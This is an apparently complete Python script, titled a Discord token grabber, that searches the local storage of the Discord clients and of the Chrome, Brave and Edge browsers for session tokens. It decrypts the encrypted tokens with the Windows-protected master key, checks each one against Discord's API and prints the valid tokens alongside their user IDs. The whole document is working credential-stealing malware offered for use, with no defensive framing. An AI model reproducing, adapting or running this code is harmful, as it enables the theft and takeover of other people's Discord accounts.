## Discord token grabber - simple version (no webhook)

import os
import re
import json
import base64
import requests
import datetime
from pathlib import Path
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

class DiscordTokenGrabber:
    def __init__(self):
        self.appdata = Path(os.getenv("LOCALAPPDATA", ""))
        self.roaming = Path(os.getenv("APPDATA", ""))
        self.regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}")
        self.encrypted_regex = re.compile(r"dQw4w9WgXcQ:([^\"]*)")
        self.tokens = set()
        self.valid_tokens = {}

        self.grab_tokens()
        self.verify_tokens()
        self.print_tokens()

    def get_master_key(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return CryptUnprotectData(base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
        except:
            return None

    def decrypt_token(self, buff, master_key):
        try:
            cipher = AES.new(master_key, AES.MODE_GCM, buff[3:15])
            return cipher.decrypt(buff[15:])[:-16].decode()
        except:
            return None

    def grab_tokens(self):
        paths = {
            "Discord": self.roaming / "discord",
            "Discord Canary": self.roaming / "discordcanary",
            "Discord PTB": self.roaming / "discordptb",
            "Chrome": self.appdata / "Google/Chrome/User Data/Default",
            "Brave": self.appdata / "BraveSoftware/Brave-Browser/User Data/Default",
            "Edge": self.appdata / "Microsoft/Edge/User Data/Default"
        }

        for name, base_path in paths.items():
            storage_path = base_path / "Local Storage/leveldb"
            if not storage_path.exists():
                continue

            master_key = None
            if "discord" in name.lower():
                local_state_path = base_path / "Local State"
                if local_state_path.exists():
                    master_key = self.get_master_key(local_state_path)

            for file in storage_path.glob("*.ldb"):
                with open(file, "r", errors="ignore") as f:
                    for line in f:
                        if master_key:
                            for match in self.encrypted_regex.findall(line):
                                token = self.decrypt_token(base64.b64decode(match), master_key)
                                if token:
                                    self.tokens.add(token)
                        else:
                            self.tokens.update(self.regex.findall(line))

    def verify_tokens(self):
        for token in self.tokens:
            response = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
            if response.status_code == 200:
                self.valid_tokens[response.json()["id"]] = token

    def print_tokens(self):
        if not self.valid_tokens:
            print("\n[ ✖ ] No discord tokens found\n")
        else:
            print("\n[ ✔ ] Discord tokens found:\n")
            for user_id, token in self.valid_tokens.items():
                creation_time = datetime.datetime.fromtimestamp(int.from_bytes(base64.urlsafe_b64decode(token.split('.')[1] + '=='), 'big') + 1293840000, datetime.UTC).strftime('%Y-%m-%d %H:%M:%S')
                print(f"🔑 {token}\n>  User ID: {user_id}  Time Created: {creation_time}\n")
            print('\n')

if __name__ == "__main__":
    DiscordTokenGrabber()